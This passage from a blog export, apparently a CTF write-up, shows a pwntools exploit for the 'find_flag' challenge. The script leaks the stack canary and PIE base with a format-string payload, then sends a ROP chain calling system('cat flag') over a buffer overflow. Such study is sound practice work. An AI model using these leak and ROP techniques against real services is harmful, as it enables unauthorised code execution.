punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> local<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tp <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'ff'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tp <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.anna.nssctf.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28068</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ff'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p---%19$p'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'you, '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'---'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>base <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Base <span class=\"token operator\">=</span> base <span class=\"token operator\">-</span> <span class=\"token number\">0x146F</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>system <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>catflag <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x2004</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#ropgadget</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>rdi <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x14E3</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>ret <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x101A</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x38</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'else? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ÁªìÊûú\"><a class=\"markdownIt-Anchor\" href=\"#ÁªìÊûú\">#</a> ÁªìÊûúÔºö</h3>\n<p><img data-src=\"/img/find_flag/image-20230609212855635.png\" alt=\"image-20230609212855635\"></p>\n",
            "tags": [
                "canary",
                "pie",
                "Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û"
            ]
        }
    ]
}